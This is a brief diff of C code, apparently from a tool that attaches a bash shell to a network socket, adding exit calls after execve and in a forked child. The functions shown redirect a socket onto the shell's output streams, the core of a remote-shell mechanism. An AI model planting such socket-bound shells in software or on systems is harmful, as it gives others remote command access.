@@ -104,6 +104,7 @@ void spawnBash( int sockfd, int pipefd[2] )
         dup2( sockfd, STDOUT_FILENO );
         dup2( sockfd, STDERR_FILENO );
         execve( cmds[0], cmds, NULL );
+        exit( EXIT_FAILURE ); // This should not happen
     } else {
         close( pipefd[0] );
         close( pipefd[1] );
@@ -153,6 +154,7 @@ void spawnShell( int sockfd )
         perror( "fork" );
     } else if ( pid == 0 ) {
         readAndFilter( sockfd, pipefd );
+        exit( EXIT_SUCCESS );
     } else {
         spawnBash( sockfd, pipefd );
         waitpid( pid, &status, 0 );
